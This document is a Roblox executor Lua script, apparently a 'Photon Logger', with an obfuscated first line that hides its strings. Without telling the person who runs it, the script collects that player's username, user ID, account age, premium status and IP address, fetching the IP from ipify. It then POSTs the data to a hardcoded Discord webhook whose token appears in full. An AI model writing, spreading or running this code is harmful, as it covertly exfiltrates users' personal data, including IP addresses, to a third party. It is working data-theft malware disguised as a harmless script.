we=true;unpack=(unpack)or(table["unpack"])qq={[1]=function()return"h".."ttps".."://".."api"..".ipify"..".org"end;[2]=nil;};setmetatable(qq,{__add=function(tt,vv)return tt[#tt+(vv-1)]end,__call=function(rt,fy)rt[fy[1]]=fy[2];end});qq[3]=(qq+2~=nil)or("\97");qq({5,(qq+3):gsub("a","Ph\x6ft\x6fn L\x6fgger")});ph=qq+(#{[[t4c-O]]}*5);co={}setmetatable(co,{__index=function(ew,pg)if(pg=="vx")then return(ph)end;end})qq[6]=co.vx;print(qq+6);
--// player.MembershipType == Enum.MembershipType.Premium
--// DateTime.now():FormatLocalTime("LL", "en-us")
--
if getgenv().ex == nil then getgenv().ex = true
local url = "h".."ttps://discord.com/api/webh\x6foks/1261085987413426198/kCT6oS1w3JxB1\x6fAqvW".."4BhtyT63QqBOPEmaiubgcpYe3LEKbXjVY7JGADy7xeq2qcyLWE"
local data = {
    ["embeds"] = {{
        ["description"] = "**"..(qq+6).."**".." **|** [**Profile**](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)",
        ["color"] = tonumber(0x6300ff),
        ["fields"] = {
            {
                ["name"] = ":bust_in_silhouette: Username",
                ["value"] = "```"..game.Players.LocalPlayer.Name.."```",
                ["inline"] = true
            },            
            {
                ["name"] = ":robot: IP",
                ["value"] = "```"..game:HttpGet((qq+1)()).."```",
                ["inline"] = true
            },
            {
                ["name"] = ":money_with_wings: Premium",
                ["value"] = "```"..(game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium and "True" or "False").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":wastebasket: Alt",
                ["value"] = "```"..(game.Players.LocalPlayer.AccountAge <= 28 and "Yes" or "No").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":baby: Age",
                ["value"] = "```"..game.Players.LocalPlayer.AccountAge.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":mobile_phone: Device",
                ["value"] = "```"..(game.Players.LocalPlayer.AccountAge <= 28 and "True" or "False").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":clock: Time",
                ["value"] = "```"..DateTime.now():FormatLocalTime("LL", "en-us").."```",
                ["inline"] = true
            },
            {
                ["name"] = ":identification_card: UserId",
                ["value"] = "```"..game.Players.LocalPlayer.userId.."```",
                ["inline"] = true
            },
            {
                ["name"] = ":family_mwgb: Players",
                ["value"] = "```"..#game.Players:GetPlayers().."```",
                ["inline"] = true
            },
        },
    }},
}

request(
    {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)
end
